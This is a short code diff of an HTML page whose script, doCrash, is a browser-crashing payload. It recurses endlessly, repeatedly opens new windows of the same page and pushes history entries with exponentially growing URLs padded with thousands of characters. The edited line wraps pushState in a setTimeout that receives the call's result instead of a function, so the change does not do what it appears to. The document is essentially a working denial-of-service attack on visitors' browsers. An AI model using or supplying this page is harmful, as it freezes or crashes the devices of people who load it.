@@ -2,7 +2,7 @@
 <body>
 <script>
 function doCrash() {
-    setInterval(function f() {window.open(location.href); history.pushState(0,0,location.href+location.href+"A".repeat(10000))},7000);    
+    setInterval(function f() {window.open(location.href); setTimeout(history.pushState(0,0,location.href+location.href+"A".repeat(10000)),300)},7000);    
     doCrash();
 };
 doCrash();
